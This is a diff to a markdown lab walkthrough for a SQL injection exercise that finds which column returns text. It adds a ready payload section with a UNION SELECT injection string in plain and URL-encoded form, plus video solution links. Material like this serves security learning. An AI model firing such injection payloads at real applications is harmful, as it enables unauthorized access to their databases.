@@ -9,7 +9,9 @@ The lab will provide a random value that you need to make appear within the quer
 3. Try replacing each null with the random value provided by the lab, for example: ```'+UNION+SELECT+'abcdef',NULL,NULL--```
 4. If an error occurs, move on to the next null and try that instead.
 
-
+## Payload
+Normal: ```' UNION SELECT NULL,'4Zcva0',NULL--```
+URL-Encoded: ```%27+UNION+SELECT+NULL,%274Zcva0%27,NULL--```
 ### Video Solution
 1. Manual: [Rana Khalil's Youtube video](https://youtu.be/SGBTC5D7DTs)
 2. Automating: [Rana Khalil's Youtube video](https://www.youtube.com/watch?v=mQquf6AHgZ4&list=PLuyTk2_mYISLaZC4fVqDuW_hOk0dd5rlf&index=5)
